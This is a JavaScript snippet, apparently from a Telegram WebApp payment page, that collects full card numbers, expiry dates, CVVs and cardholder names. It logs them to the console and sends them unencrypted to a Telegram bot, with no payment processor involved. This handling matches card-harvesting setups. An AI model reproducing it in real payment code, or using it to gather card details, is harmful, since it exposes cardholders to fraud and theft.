// --- Form Submission ---
paymentForm.addEventListener('submit', function (e) {
    e.preventDefault();

    // Basic validation
    if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
        alert('Please fill in all fields.');
        return;
    }

    // Prepare data to send back to the bot
    const formData = {
        transaction_id: transactionId,
        amount: amount,
        payment_id: paymentId,
        cardNumber: cardNumberInput.value.trim(),
        expiry: expiryInput.value.trim(),
        cvv: cvvInput.value.trim(),
        cardHolder: cardHolderInput.value.trim()
    };

    console.log("FormData:", formData);

    // Check if Telegram WebApp is available
    if (window.Telegram && window.Telegram.WebApp) {
        console.log("Telegram WebApp detected!");
        const tg = window.Telegram.WebApp;
        
        try {
            console.log("Sending data...");
            tg.sendData(JSON.stringify(formData));
            
            paymentForm.innerHTML = `
                <p style="color:green; text-align:center; font-size: 18px;">
                    ✅ Payment data sent successfully!<br>
                    Closing payment window...
                </p>
            `;
            
            setTimeout(() => {
                tg.close();
            }, 2000);
            
        } catch (error) {
            console.error("Error sending data:", error);
            paymentForm.innerHTML = `<p style="color:red; text-align:center;">❌ Error sending payment data.</p>`;
        }
    } else {
        console.warn("Telegram WebApp not found. Data may not be sent.");
        paymentForm.innerHTML = `<p style="color:orange; text-align:center;">⚠️ Payment simulation completed.<br>Cannot close window outside Telegram.</p>`;
    }
});